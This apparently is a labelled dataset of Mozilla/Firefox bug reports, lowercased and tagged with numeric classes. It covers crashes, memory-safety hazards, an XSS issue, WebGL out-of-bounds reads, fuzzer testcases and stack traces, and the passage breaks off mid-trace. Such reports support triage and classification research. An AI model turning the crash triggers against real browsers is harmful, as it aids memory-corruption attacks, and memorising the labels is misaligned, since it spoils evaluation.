ff4 crashes on multipart image/motion jpeg stream changing image size mozilla imagelib decoder finish user-agent mozilla/5.0 macintosh u intel mac os x 10.6 en-us rv:1.9.2.15 gecko/20110303 firefox/3.6.15 build identifier nightly build 5.march 2011 downloaded from web page containing ui elements select box changing the select box element will remotely on the server start a cgi script and set the relevant parameter something crashes ff4 reproducible always steps to reproduce 1 open url and authorize authorization credentials type without the quotes user user password firefox 2 from select box the one in the middle choose image size 3 from select box the one on the right choose mega or vga whatever is not selected actual results ff4 crashes expected results image size is set to the selected size	11
settimeout close closes a window the page is n't allowed to close no description provided	2
problem with nsjscontext calleventhandler in nsjscontext calleventhandler after popping a principal when converting rval to variant we access properties of rval if rval is an array thus it s possible to call a native function without a frame or a pushed principal in which case a result of nsscriptsecuritymanager iscapabilityenabled is true	2
universal xss using settimeout by loading a target page in the middle of nsjscontext calleventhandler it s possible to perform an xss attack on trunk this is fixed by bug 614151 and bug 643450	2
crash js_gc or assertion failure obj isdensearray at jsarray.cpp function e eval function x.k function for x in 0 asserts js debug shell without j on tm tip at assertion failure obj_is_dense_array cx obj at jsarray.cpp:2290 autobisect shows this is probably related to bug 452498 the first bad revision is changeset 26784:2cf0bbe3772a user brendan eich date sun apr 05 21:17:22 2009 0700 summary upvar2 aka the big one take 2 452598 r=mrbkap	11
investigate if str chars should always clear extensible currently jsstring chars and similar methods that leaks the char array pointer do not clear the extensible flag assuming that the caller will do it on its own if the char array pointer must stay the same but that may lead to a hazard if the caller forgets to clear a flag when a script can be executed before the char array is accessed again for example consider the following fragment from array_tostring_sub l1224 sepstr getcharsandlength sep seplen js_getlengthproperty cx obj length cb.append sep seplen if a getter executed by js_getlengthproperty can turn sepstr into a dependent string then we would get a hazard as chars will point to freed memory which code then proceed to copy into a script visible memory note i have not verified that we have a real hazard here but just want to give an example of code where we can have a problem to stop such hazards from realizing i suggest to always clear extensible in jsstring chars and similar methods if this turned out to harm some benchmarks we can consider to add something like jsstring getvolatilechars and use it at places that affect benchmarks	11
xml_elements writes past the end of the argument vector x x for a 0 a 9 a x.elements crashes 64-bit js opt shell on tm changeset db8be4e3f373 with j at js executetree but does not seem to crash on js debug shell s-s because this seems to be accessing a weird memory address at program received signal exc_bad_access could not access memory reason 13 at address in js executetree gdb bt 0 in js executetree 1 in js recordloopedge 2 in js monitorloopedge 3 in js interpret 4 in js execute 5 in js_executescript 6 in process 7 in shell 8 in main gdb x/i pc zn2jsl11executetreeep9jscontextpns_12tracemonitorepns_12treefragmenterjppns_10vmsideexites9_+859 incl rbx gdb x/b rbx can not access memory at address autobisect shows this is probably related to the following changeset the first bad revision is changeset 53579:802d34381fe4 user david mandelin date fri sep 03 15:12:38 2010 0700 summary bug 593497 blacklist using iteration count only if methodjit is enabled r=dvander	11
crash in xul nsxblbinding allowscripts user-agent mozilla/5.0 windows u windows nt 6.1 en-us rv:1.9.2.15 gecko/20110303 firefox/3.6.15 build identifier description following testcase uses a combination of frames iframes and a xul element the observed crashes show exploitable behaviour such as 32-bit linux firefox 3.6.15 eax 99992769 gdb x/10i eip call eax affected versions firefox 3.6.15 windows and linux firefox 4 is not affected as xul is disabled by default testcase the testcase is attached as an html file it will crash the browser on opening after several reloads testcase notes the testcase uses jesse s quitter extension to reliably trigger garbage collection stack backtrace following testcases have been observed windows firefox 3.6.15 1718.1944 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled xul nsxblbinding allowscripts 6165e644 8b8024010000 mov eax dword ptr eax+124h ds:002b:010061e5 xul nsxblbinding allowscripts void xul nsrunnable release void xul nsrunnablemethod nsoggdecoder void run void xul nsgenericelement doreplaceorinsertbefore int areplace 90637520 class nsidomnode anewchild class nsidomnode arefchild class nsicontent aparent class nsidocument adocument class nsidomnode areturn xul xpc_qsunwrapargimpl struct jscontext cx int v 298980787 struct nsid iid void pparg class nsisupports ppargref int vp xul nsgenericelement appendchild class nsidomnode anewchild class nsidomnode areturn xul nsidomnode_appendchild struct jscontext cx unsigned int argc int vp js3250 js_fillpropertycache struct jscontext cx struct jsobject obj unsigned int scopeindex unsigned int protoindex struct jsobject pobj struct jsscopeproperty sprop int adding 1010814013 js3250 js_interpret struct jscontext cx ubuntu 64-bit firefox gdb bt 30 0 in getdocument this at dist/include/nsnodeinfomanager.h:117 1 getdocument this at dist/include/nsinodeinfo.h:291 2 getownerdoc this at dist/include/nsinode.h:367 3 nsxblbinding allowscripts this at nsxblbinding.cpp:1394 4 in nsxblbinding executeattachedhandler this at nsxblbinding.cpp:978 5 in nsxblbinding executeattachedhandler this at nsxblbinding.cpp:974 6 in nsrunnablemethod nsxblbinding void run this value optimized out at dist/include/nsthreadutils.h:282 7 in nscontentutils removescriptblocker at nscontentutils.cpp:4488 8 in nsdocument endupdate this aupdatetype value optimized out at nsdocument.cpp:3859 9 in nshtmldocument endupdate this aupdatetype=4294954700 at nshtmldocument.cpp:3034 10 in mozautodocconditionalcontentupdatebatch areplace value optimized out anewchild value optimized out arefchild aparent adocument areturn value optimized out at mozautodocupdate.h:112 11 nsgenericelement doreplaceorinsertbefore areplace value optimized out anewchild value optimized out arefchild aparent adocument areturn value optimized out at nsgenericelement.cpp:3956 12 in nsidomnode_appendchild cx argc value optimized out vp at dom_quickstubs.cpp:2617 13 in js_interpret cx at jsops.cpp:2208 14 in js_execute cx chain value optimized out script value optimized out down flags=4159402048 result at jsinterp.cpp:1601 15 in js_evaluateucscriptforprincipals cx obj principals value optimized out chars value optimized out length value optimized out filename value optimized out lineno=28 rval at jsapi.cpp:5056 16 in nsjscontext evaluatestring this ascript value optimized out ascopeobject aprincipal value optimized out aurl value optimized out alineno value optimized out aversion=0 aretvalue aisundefined at nsjsenvironment.cpp:1764 17 in nsglobalwindow runtimeout this atimeout at nsglobalwindow.cpp:8186 18 in nsglobalwindow timercallback atimer value optimized out aclosure at nsglobalwindow.cpp:8539 19 in nstimerimpl fire this at nstimerimpl.cpp:427 20 in nstimerevent run this value optimized out at nstimerimpl.cpp:519 21 in nsthread processnextevent this maywait=0 result at nsthread.cpp:527 22 in ns_processnextevent_p thread maywait=-12596 at nsthreadutils.cpp:250 23 in mozilla ipc messagepump run this adelegate at messagepump.cpp:110 24 in messageloop run this at src/base/message_loop.cc:173 25 in nsbaseappshell run this at nsbaseappshell.cpp:174 26 in nsappstartup run this at nsappstartup.cpp:183 27 in xre_main argc value optimized out argv value optimized out aappdata value optimized out at nsapprunner.cpp:3483 28 in main argc=1 argv at nsbrowserapp.cpp:158 vulndev reference vd11004 reported by nils of vulndev ltd reproducible always	11
crash with too complex regular expressions in js1_5/extensions/regress-330569.js and js1_5/extensions/regress-351448.js js1_5/extensions/regress-330569.js and js1_5/extensions/regress-351448.js crash browser and shell opt and debug on 1.9.2 linux 32 and 64 bit at least have n't tried others regressed around 2011-07-23	11
angle crash gl vertexdataconverter float gl widenrule int 2 gl conversionrule int 0 int gl defaultvertexvalues float int convertarray float const unsigned int unsigned int float with google labs body map this bug was filed from the socorro interface and is report bp-8a45c98b-589b-481f-99c1-f042b2110330 since 2011-03-29 but really on 2011-03-03 we see a rise in crashes with that signature the comments in seem to almost all point to google labs body map and and as i heard this launched in the last days the rise seems to correspond there was a small amount of crashes with this signature around before 2-20 crashes per day when we still processed all crash reports on 2011-03-30 we have 61 crashes with only 10 of all crashes being processed by the socorro system so in reality we probably have 600 making this 186 on this day s topcrash list for 4.0 versions	11
assertion bad this object in get or crash xpc holder_get with installtrigger symptoms are exactly the same as old bug 608963 debug assertion bad this object in set wrapper isproxy file js/src/xpconnect/wrappers/xraywrapper.cpp line 207 assertion failure isproxy at jsproxy.h:193 opt crash bp-8c6523b2-2b06-4848-9cbb-089062110406 xpc holder_set filing as security-sensitive because installtrigger/wrappers is a sensitive area	11
assertion failure compartment mismatched with settimeout assertion failure compartment mismatched at js/src/jscntxtinlines.h:542	11
abort bad scope for new jsobjects with settimeout abort bad scope for new jsobjects type.isarithmetic cx compartment lccx.getscopefornewjsobjects compartment file js/src/xpconnect/src/xpcconvert.cpp line 253	11
crash nssmilinstancetime handlechangedinterval nssmiltimecontainer const int int nssmilinstancetime handlechangedinterval mardeg reported this crash in irc bp-78a2bf1e-bcc7-4b02-a751-555a32110417 he does n't have str but he says he d just closed a tab with animated svg before crashing looking at the stack trace it s cycle-collection triggering nssmiltimedelement unlink which eventually triggers nssmilinstancetime handlechangedinterval which hits this line 141 prbool objectchanged mcreator dependsonbegin abeginobjectchanged 142 aendobjectchanged and crashes on a null-deref since mcreator is apparently null	11
assertion failure jsval_is_double_impl data assertion failure jsval_is_double_impl data at js/src/jsvalue.h:715 tm branch only i m guessing it s a tm branch regression tested using	11
assertion unable to transplant wrappers probably oom assertion unable to transplant wrappers probably oom error file dom/base/nsglobalwindow.cpp line 2096 it s not oom and there are also several errors from chrome code in tabbrowser.xml and nsloginmanager.js which is worrisome javascript error line 0 uncaught exception exception could not convert native argument arg 0 nsiwebprogress.domwindow nsresult ns_error_xpc_bad_convert_native location js frame chrome browser/content/tabbrowser.xml top_level line 605 data no exception could not convert native argument arg 0 nsiwebprogress.domwindow nsresult ns_error_xpc_bad_convert_native location js frame resource components/nsloginmanager.js top_level line 285 data no javascript error line 0 uncaught exception exception could not convert native argument arg 0 nsiwebprogress.domwindow nsresult ns_error_xpc_bad_convert_native location js frame chrome browser/content/tabbrowser.xml top_level line 547 data no	11
ti crash jsstring isflat gczeal let n let o for let i 0 i 5 i array for let j 0 j 7 j o.__definesetter function o.p3 1 delete o.p3 crashes js debug shell on jm changeset 6d423e5f2e48 with m j and n at jsstring isflat this was found using a combination of jsfunfuzz and jandem s method fuzzer gdb bt 0 in jsstring isflat this at jsstr.h:313 1 in jsstring ensureflat this cx at jsstr.h:723 2 in jsstring getcharsz this cx at jsstr.h:703 3 in js types maketypeid cx id asbits 1304416 at jsinferinlines.h:118 4 in inlineaddtypeproperty cx obj id asbits 1304416 type=1 at users/fuzz3/desktop/jsfunfuzz-dbg-64-jm-70388-6d423e5f2e48/compilepath/js/src/jsinfer.cpp:2723 5 in js types typeobject addpropertytype this cx id asbits 1304416 type=1 at users/fuzz3/desktop/jsfunfuzz-dbg-64-jm-70388-6d423e5f2e48/compilepath/js/src/jsinfer.cpp:2739 6 in js types addtypepropertyid cx obj id asbits 1304416 type=1 at jsinferinlines.h:325 7 in jsobject deleteproperty this cx id asbits 1304416 rval strict=0 at jsobjinlines.h:161 8 in js mjit stubs delprop 0 f atom at users/fuzz3/desktop/jsfunfuzz-dbg-64-jm-70388-6d423e5f2e48/compilepath/js/src/methodjit/stubcalls.cpp:2649 9 in 10 in js mjit entermethodjit cx fp code stacklimit at users/fuzz3/desktop/jsfunfuzz-dbg-64-jm-70388-6d423e5f2e48/compilepath/js/src/methodjit/methodjit.cpp:886 11 in checkstackandentermethodjit cx fp code at users/fuzz3/desktop/jsfunfuzz-dbg-64-jm-70388-6d423e5f2e48/compilepath/js/src/methodjit/methodjit.cpp:918 snip	11
websocket data framing crash mozilla net nswebsockethandler applymask received connection 127.0.0.1 61673 http/1.1 101 switching protocols upgrade websocket connection upgrade sec-websocket-accept x6x5fx2b1laim7qzxyalch7gw6c sending b'\t\xff\xfe\x81\x05hello	11
crash documentviewerimpl print with onbeforeprint see testcase which crashes current trunk build i guess a regression of bug 307258 0 xul.dll documentviewerimpl print layout/base/nsdocumentviewer.cpp:3694 1 xul.dll nsglobalwindow print dom/base/nsglobalwindow.cpp:5112 2 xul.dll nsglobalwindow print dom/base/nsglobalwindow.cpp:5077 3 xul.dll ns_invokebyindex_p xpcom/reflect/xptcall/src/md/win32/xptcinvoke.cpp:102 4 xul.dll xpc_wn_callmethod js/src/xpconnect/src/xpcwrappednativejsops.cpp:1607 5 mozjs.dll js invoke js/src/jsinterp.cpp:656 6 mozjs.dll js interpret js/src/jsinterp.cpp:4550 7 mozjs.dll js runscript js/src/jsinterp.cpp:613 8 mozjs.dll js invoke js/src/jsinterp.cpp:686 9 mozjs.dll js externalinvoke js/src/jsinterp.cpp:805 10 mozjs.dll js_callfunctionvalue js/src/jsapi.cpp:5098 11 xul.dll nsjscontext calleventhandler dom/base/nsjsenvironment.cpp:1900 12 xul.dll nsglobalwindow runtimeout dom/base/nsglobalwindow.cpp:9211 13 xul.dll nsglobalwindow timercallback dom/base/nsglobalwindow.cpp:9552 14 xul.dll nstimerimpl fire xpcom/threads/nstimerimpl.cpp:424 15 xul.dll nstimerevent run xpcom/threads/nstimerimpl.cpp:520 16 xul.dll nsthread processnextevent xpcom/threads/nsthread.cpp:618 17 xul.dll mozilla ipc messagepump run ipc/glue/messagepump.cpp:110 18 xul.dll xul.dll etc the iframe content is this script settimeout function window.print 10 script frameset onbeforeprint window.frameelement.parentnode.removechild window.frameelement frameset	11
xslt crashes firefox 5 and firefox 7 but not firefox 4 user-agent mozilla/5.0 windows nt 5.1 rv:5.0 gecko/20100101 firefox/5.0 build identifier mozilla/5.0 windows nt 5.1 rv:5.0 gecko/20100101 firefox/5.0 some but not all xslt crashes firefox 5 on windows 7 and xp this crash did not happen on firefox 4 or earlier the crash happens on local xslt files as well reproducible always steps to reproduce 1 load the page indicated in the url actual results loading the xslt at the cited url crashes firefox 5 but not 4 and earlier expected results firefox 5 should not crash because firefox 4 did not crash and neither do ie or chrome i have n't tried methodically whittling down the xslt to find out whether it is a particular function or extension which is causing the crash if that is something that would be useful i can do it otherwise i am hoping other people report similar problems	11
crash nsiframe peekoffset with removing br and table cell and pressing right arrow key see testcase which crashes current trunk build after pressing the right arrow key 0 1 xul.dll nsiframe peekoffset layout/generic/nsframe.cpp:5598 2 xul.dll nsframeselection movecaret layout/generic/nsselection.cpp:1240 3 xul.dll nsframeselection movecaret layout/generic/nsselection.cpp:1105 4 xul.dll nsframeselection charactermove layout/generic/nsselection.cpp:2191 5 xul.dll presshell charactermove layout/base/nspresshell.cpp:3150 6 xul.dll nsselectionmovecommands docommand editor/libeditor/base/nseditorcommands.cpp:718 7 xul.dll nscontrollercommandtable docommand embedding/components/commandhandler/src/nscontrollercommandtable.cpp:191 8 xul.dll nsbasecommandcontroller docommand embedding/components/commandhandler/src/nsbasecommandcontroller.cpp:169 9 xul.dll nsxblprototypehandler dispatchxblcommand content/xbl/src/nsxblprototypehandler.cpp:499 10 xul.dll nsxblprototypehandler executehandler 11 xul.dll nsxblprototypehandler modifiersmatchmask content/xbl/src/nsxblprototypehandler.cpp:1027 12 xul.dll nscomptr_base assign_from_helper obj-firefox/xpcom/build/nscomptr.cpp:152 13 xul.dll nscomptr nsidomelement nscomptr nsidomelement obj-firefox/dist/include/nscomptr.h:644 14 xul.dll nsxblwindowkeyhandler getelement content/xbl/src/nsxblwindowkeyhandler.cpp:589 15 xul.dll nscomptr_base assign_with_addref obj-firefox/xpcom/build/nscomptr.cpp:88 16 xul.dll nsrefptr nsidomeventlistener nsrefptr nsidomeventlistener obj-firefox/dist/include/nsautoptr.h:969 17 xul.dll nshashtable get xpcom/ds/nshashtable.cpp:246 18 xul.dll nsxbldocumentinfo getprototypebinding content/xbl/src/nsxbldocumentinfo.cpp:545 19 xul.dll nsxbldocumentinfo getprototypebinding content/xbl/src/nsxbldocumentinfo.cpp:545 20 xul.dll nsxblspecialdocinfo gethandlers content/xbl/src/nsxblwindowkeyhandler.cpp:153 21 xul.dll nsxblspecialdocinfo getallhandlers content/xbl/src/nsxblwindowkeyhandler.cpp:173	11
crash mozilla places history notifyvisited nsiuri 1 2 opens multitudes of external programs for various protocols for example mail instances outlook on the crash automation as well as irc if you have that set up 3 crash aurora original socorro report bp-6165cea3-0d6e-4841-ba25-f33692110626 0 xul.dll mozilla places history notifyvisited 1 xul.dll mozilla places anonymous namespace notifyvisitobservers run toolkit/components/places/history.cpp:477 2 xul.dll nsthread processnextevent xpcom/threads/nsthread.cpp:618 3 nspr4.dll pr_getthreadprivate nsprpub/pr/src/threads/prtpd.c:232 4 xul.dll ns_processnextevent_p obj-firefox/xpcom/build/nsthreadutils.cpp:250 5 xul.dll nsxulwindow showmodal xpfe/appshell/src/nsxulwindow.cpp:419 6 xul.dll nscontenttreeowner showasmodal xpfe/appshell/src/nscontenttreeowner.cpp:554 7 xul.dll nswindowwatcher openwindowjsinternal other reports on windows firefox 4 and 5 crash report 1 operating system windows nt 5.1.2600 service pack 3 cpu x86 genuineintel family 6 model 44 stepping 2 1 cpu crash reason exception_access_violation_read crash address thread 0 crashed 0 xul.dll nstarray_base nstarraydefaultallocator length nstarray.h 139 eip esp ebp ebx esi edi eax ecx edx efl found by given as instruction pointer in context 1 xul.dll mozilla places history notifyvisited nsiuri history.cpp 1304 eip esp ebp found by call frame info	11
the fix for bug 639728 forgot that items are created lazily the fix for bug 639728 forgot that items are created lazily checking that the list length is going to change to zero is not enough the last remaining reference to the object may be a single item at an arbitrary index so really we have to check whether the list length is decreasing	11
createnpobjectmember jsids do n't appear to be rooted the jsid in createnpobjectmember may be a non-rooted identifier 2089 it should be traced at 2292 but currently the jsapi does n't actually expose a public function for tracing jsid filing as private becuase it s theoretically possible to abuse this via script to perhaps dereference string characters which were gced	11
crash txexecutionstate end 1 2 crash after timing out windows xp and linux 32bit beta so far one instance on linux so far operating system linux 0.0.0 linux 2.6.35.13-91.fc14.i686.pae 1 smp tue may 3 13:29:55 utc 2011 i686 cpu x86 genuineintel family 6 model 44 stepping 2 1 cpu crash reason sigsegv crash address thread 0 crashed 0 libxul.so txexecutionstate end txexecutionstate.cpp 202 eip esp ebp ebx esi edi eax ecx edx efl found by given as instruction pointer in context 1 libxul.so txmozillaxsltprocessor transformtodoc txmozillaxsltprocessor.cpp 718 eip esp ebp ebx esi edi found by call frame info 2 libxul.so nstransformblockerevent run txmozillaxsltprocessor.cpp 595 eip esp ebp ebx esi edi found by call frame info 3 libxul.so nsthread processnextevent nsthread.cpp 618 eip esp ebp ebx esi edi found by call frame info 4 libxul.so ns_processnextevent_p nsthreadutils.cpp 250 eip esp ebp ebx esi edi found by call frame info 5 libxul.so mozilla ipc messagepump run messagepump.cpp 110 eip esp ebp ebx esi edi found by call frame info	11
assertion not a file url assertion not a file url error file netwerk/base/src/nsstandardurl.cpp firefox seems to be quite confused about what kind of url d\nata text/plain,2 is some parts are treating it as a data url and others are n't	11
crash gfxmixedfontfamily replacefontentry gfxfontentry gfxfontentry 1 in nightly on windows xp 2 crash ted s exploitable breakpad anaylyser gives this a high exploitability which actually matches the use of deleted memory this mhdr const nstarray_base nstarraydefaultallocator const return the number of elements in the array size_type length const return mhdr mlength xul.dll nstarray_base nstarraydefaultallocator length line 140 bytes c xul.dll gfxmixedfontfamily replacefontentry gfxfontentry aoldfontentry gfxfontentry anewfontentry line 116 bytes c xul.dll nsuserfontset replacefontentry gfxproxyfontentry aproxy gfxfontentry afontentry line 688 c xul.dll gfxuserfontset onloadcomplete gfxproxyfontentry aproxy const unsigned char afontdata unsigned int alength=21812 unsigned int adownloadstatus=0 line 560 c xul.dll nsfontfaceloader onstreamcomplete nsistreamloader aloader nsisupports acontext unsigned int astatus=0 unsigned int astringlen=21812 const unsigned char astring line 220 bytes c xul.dll nsstreamloader onstoprequest nsirequest request nsisupports ctxt unsigned int astatus=0 line 125 bytes c xul.dll nscorslistenerproxy onstoprequest nsirequest arequest nsisupports acontext unsigned int astatuscode=0 line 623 c i was able to reproduce the crash but not the deleted memory in debug aurora i was not able to reproduce the crash in debug beta i was not able to reproduce with nightly nightly or aurora builds this was found from crash automation from bp-5279a5dd-12aa-4dcc-bb1d-471152110616 which matches the detected crash	11
crash in nsdomevent queryinterface nsid const void seen while reviewing crash data and 100 reproducible on the site in the url using mozilla/5.0 macintosh u intel mac os x 10.6 en-us rv:1.9.3a3pre gecko/20100312 minefield/3.7a3pre str 1 load site in url 2 perform and right click event and then scroll crash are my three crash reports and my flash version is below file flash player.plugin version 10.1.51.95 shockwave flash 10.1 d51	11
tm assertion failure shape previous obj lastproperty with gc eval o15 function f11 o props object.getownpropertynames o prop props.length prop prop.e o prop 3 function f12 o someglobal o for j 0 j 5 j for x in x x function return someglobal x x x x function x x gc for i 0 i 100 i f12 o15 f11 o15 asserts js debug shell on tm changeset 599d1c6cba63 with j at assertion failure shape previous obj lastproperty setting s-s just-in-case because this involves gc autobisect shows this is probably related to the following changeset the first bad revision is changeset 54718 b079aae53212 user igor bukanov date tue sep 21 14:58:19 2010 0200 summary bug 597736 fixing treefragment leak r=gal	11
the gc can still happen when reporting oom the bug 640265 tries to prevent the gc from happening when reporting oom hover the implemented fix has a race that still allows to run the gc under oom the problem comes from using the global boolean jsruntime inoomreport flag that is updated and checked outside a lock as such the check in the js_gc for the flag can happen after an oom also happens on another thread which can clear the flag before js_gc accesses it	11
weakmap uses a contextallocpolicy should use a systemallocpolicy each weakmap object keeps a pointer to the jscontext in which it was created it s used to report oom errors possible consequences this could cause an oom error to be reported in the wrong context which is not so bad this could cause us to try to report oom in a context that has been destroyed which might be exploitable we call through a function pointer cx errorreporter	11
crash cairo_bentley_ottmann_tessellate_rectangular possibly a regression from the recent cairo update	11
weakmap values can be incorrectly classified as garbage by cycle collector igor pointed out that the patch in bug 653248 will probably lead to the cycle collector sometimes classifying reachable js objects as unreachable which in turn will lead to the cc incorrectly freeing dom objects that are reachable from js side i m not sure what exactly happens but i d imagine that in the worst case it could make freed memory reachable from js potentially leading to crashes and other badness the scenario he came up with is this a weakmap m is reachable from js roots and m contains a key k and value v which are reachable only from dom after the patch in bug 653248 the gc will mark m black and k and v grey when the cycle collector runs its graph will have an edge from m to v but not from k to v which is wrong because m is marked black the cc will not traverse it if v is part of what looks like a garbage cycle through dom then the cc will mark v as garbage as it does n't see that k is holding on to v the dom part of the cycle involving v will be freed but this is still reachable from js via m and k with the previous behavior the gc would mark the value black if either the map or the key is reachable in any way ie are marked black or grey this leaks as it will never free cycles that pass through a weakmap value but is safe because it ensures that anything reachable from a reachable value is never freed the short term solution is to back out the patch in bug 653248 longer term the cycle collector needs a more accurate picture of the weak map edges it seems likely this will require making the cycle collector actually aware of weakmaps the basic problem is that most edges act like an or if an object is reachable from any incoming edge it is reachable for a weak map the map and key act more like and wrt the value both map and key must be reachable for the value to be reachable via the weak map i ll try to come up with a test for this	11
tm/jm assertion failure shape previous obj lastproperty with gc for i 0 i 10 i object.defineproperty get function gc asserts js debug shell on tm changeset bf147b22f72c with m a and j at assertion failure shape previous obj lastproperty locking s-s because this involves gc and just-to-be-safe autobisect shows this is probably related to the following changeset the first bad revision is changeset 71353 dc137da5a3b4 user igor bukanov date tue may 31 10:01:09 2011 0200 summary bug 657198 improving unreachable gc things detection in traces r=gal	11
assertion frame crosses fixed continuation boundary with rtl pre-wrap first-letter assertion frame tree not empty but caller reported complete status asubtreeroot getprevinflow file layout/base/nslayoututils.cpp line 4124 assertion frame crosses fixed continuation boundary flowlength mendflowoffset getcontentend file layout/generic/nstextframethebes.cpp line 643 the first bad revision is changeset 99c270809649 user simon montagu date mon jun 27 19:30:04 2011 0300 summary do n't overshoot the end of the sibling chain when copying text for bidi resolution bug 665837 r=roc security-sensitive because there related testcases trigger scarier assertions and because the regressor was security sensitive	11
crash with installtrigger mozrequestanimationframe throwing proxy assertion no scope has this global object okifnotinitialized file builds/slave/m-cen-osx64-dbg/build/js/src/xpconnect/src/xpcwrappednativescope.cpp line 840 xpcwrappednativescope findinjsobjectscope js/src/xpconnect/src/xpcwrappednativescope.cpp:841 xpcwrappednativescope findinjsobjectscope js/src/xpconnect/src/xpcprivate.h:1503 getcontextfromobject js/src/xpconnect/src/xpcwrappedjsclass.cpp:574 nsxpcwrappedjsclass callmethod js/src/xpconnect/src/xpcwrappedjsclass.cpp:1289 nsxpcwrappedjs callmethod js/src/xpconnect/src/xpcwrappedjs.cpp:585 prepareanddispatch xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_darwin.cpp:153 debug crash xpcwrappednativescope getcontext getcontextfromobject opt crash bp-be925f53-6a18-40b4-9829-a9a0a2110704 security-sensitive for now because this involves a chrome-content boundary	11
assertion function object has parent of unknown class assertion function object has parent of unknown class error file js/src/xpconnect/src/xpcwrappednative.cpp line 1759 abort should have a slim wrapper mflattenedjsobject is_slim_wrapper mflattenedjsobject file js/src/xpconnect/src/xpccallcontext.cpp line 199 does n't crash in opt but the messages are scary so security-sensitive for now	11
crash via mozilla gl glcontext uploadsurfacetotexture on mac playing a video playing the video at reliably crashes my macosx nightly build crash address looks random so this might be exploitable	11
assertion failure priv stackelems stackdepth elem 1 2 assertion failure priv stackelems stackdepth elem at work/mozilla/builds/nightly/mozilla/js/src/jsexn.cpp:363 reproduced on mac win nightly and aurora opt aurora build did n't crash fwiw dmandelin gal lots of tracing on the stack	11
out-of-bounds array access in nsdocaccessible cachechildreninsubtree 1 enable accessibility e.g by pasting the following into the js console components.classes mozilla.org/accessibilityservice 1 getservice components.interfaces.nsiaccessibleretrieval 2 load the testcase result assertion invalid array index in nstarray elementat nb not safeelementat followed by a crash nsaccessnode iscontent both are called by nsdocaccessible cachechildreninsubtree so i assume that s closer to where the bug is in debug builds it usually crashes near but in opt builds it s clearly exploitable bp-aad90a7b-4402-40f4-bd6d-92a4d2110724	11
assertion window still registered with device motion and crash steps to reproduce 1 load the testcase 2 quit firefox or close the tab and click the mp button in about memory result an assertion fails during gc assertion window still registered with device motion mhasdevicemotion file dom/base/nsglobalwindow.cpp line 1039 which is soon followed by invalid read of freed memory nsdevicemotion devicemotionchanged in order to make a virtual function call beware bp-4cdef108-d00e-4b39-8e21-d86152110813 makes it look like a null deref but it is actually a more serious bug	11
let-block variable initializers are statically outside the let-scope but dynamically inside it the expr in let x expr foo is supposed to be outside the scope of the lexical variable x being declared the compiler gets this right for names it can bind statically but it still emits the bytecode for the expression after the jsop_enterblock instruction that means the scope is wrong for plain old jsop_name opcodes var x 5 let x x asserteq x 5 pass let x eval x asserteq x 5 fail let x function with return x asserteq x 5 fail let x x asserteq x 5 pass let x eval x asserteq x 5 fail let x function with return x asserteq x 5 fail i ca n't think of a clever way to fix this offhand	11
crash running jellyfish demo on 64-bit build current trunk nightly and my optimized self-build steps to reproduce 1 disable content methodjit 2 load expected results no crash actual results crash additional information i submitted some nightly crash reports looks like a null-deref but ca n't say more than that we re definitely crashing on trace interestingly my 32-bit debug build does not hit the crash my 64-bit builds do i do n't quite know where the null-deref comes from some info from gdb program received signal exc_bad_access could not access memory reason 13 at address in gdb p pc 4 void void gdb disas pc-50 pc+20 dump of assembler code from to add al rax sbb al rax movd rsi mm4 mulsd xmm7 xmm2 addsd xmm2 xmm15 mov rsi movd rsi xmm2 mulsd xmm5 xmm1 addsd xmm1 xmm15 xorps xmm1 xmm1 cvtsd2ss xmm15 xmm1 movss xmm1 rsi mov esi movd rsi xmm1 lea rbx rsi lea rbx rsi gdb info reg rsi rsi 9221120237041090560 i guess is a non-canonical address and chances are that s what s killing us but not sure i can reproduce this at will so if there s something else useful i can report please let me know	11
webgl functions allocating buffers/textures must check that the gl call succeeded to prevent allowing context to make out-of-bounds accesses thanks a lot to gregg tavares at google for reporting this begin email hi guys while i was looking into some perf issues i found what i think is a security issue in both firefox and webkit implementations of webgl the issue is that neither of these implementations check for errors on glbufferdata glteximage2d or glcopyteximage2d so for example if a user does this buf gl.createbuffer gl.bindbuffer gl.array_buffer buf gl.bufferdata gl.array_buffer verylargesizethatrunsoutofmemoryoristoolargefordriver gl.static_draw assume this fails at this point because neither webkit nor firefox check for error they think the buffer is verylargesize so for example validating indices when calling gl.drawelements will be wrong for textures the same issues would exist for example create a texture that is too big creation fails but browser thinks the texture is large since it did not check for error now bind that texture to an fbo and call readpixels you can now read pixels outside the bounds of the texture since the implementation will not be clearing past the bounds end email	11
assertion uh inner window set as event target steps to reproduce 1 run mochitest toolkit/components/passwordmgr/test/test_master_password.html actual results assertion uh inner window set as event target win win isinnerwindow file content/events/src/nsdomevent.cpp line 878 platforms and builds tested bug occurs in a local mozilla-central debug build on linux x86-64	11
crash jsparsenode append or assertion failure pn pn_defn the following test asserts on mozilla-central revision c9cdc5df55f4 no options required with starttest for var title=0 in starttest section huh	11
tm assertion failure ptrbits 0 or crash js gc arenaheader allocated the attached test asserts on mozilla-central revision d066929dd830 run with options j m stepping through the assertions will cause a crash program received signal sigsegv segmentation fault in js gc arenaheader allocated this at jsgc.h:261 261 return thingkind finalize_limit gdb bt 16 0 in js gc arenaheader allocated this at jsgc.h:261 1 in js gc arenaheader getthingkind this at jsgc.h:271 2 in js gc getgcthingtracekind thing at home/decoder/langfuzz/mozilla-central/js/src/jsgcinlines.h:110 3 in js gc markkind trc thing kind=0 at home/decoder/langfuzz/mozilla-central/js/src/jsgcmark.cpp:332 4 in js_calltracer trc thing kind=0 at home/decoder/langfuzz/mozilla-central/js/src/jsapi.cpp:2184 5 in exn_trace trc obj at home/decoder/langfuzz/mozilla-central/js/src/jsexn.cpp:417 6 in scanobject gcmarker obj at home/decoder/langfuzz/mozilla-central/js/src/jsgcmark.cpp:628 7 in js gcmarker drainmarkstack this at home/decoder/langfuzz/mozilla-central/js/src/jsgcmark.cpp:791 8 in markandsweep cx comp gckind=gc_normal gctimer at home/decoder/langfuzz/mozilla-central/js/src/jsgc.cpp:2273 9 in gccycle cx comp gckind=gc_normal gctimer at home/decoder/langfuzz/mozilla-central/js/src/jsgc.cpp:2641 10 in js_gc cx comp gckind=gc_normal at home/decoder/langfuzz/mozilla-central/js/src/jsgc.cpp:2727 11 in runlastditchgc cx at home/decoder/langfuzz/mozilla-central/js/src/jsgc.cpp:1349 12 in js gc rundebuggc cx at home/decoder/langfuzz/mozilla-central/js/src/jsgc.cpp:2902 13 in newgcthing js shape cx thingkind=13 thingsize=64 at home/decoder/langfuzz/mozilla-central/js/src/jsgcinlines.h:203 14 in js_newgcshape cx at 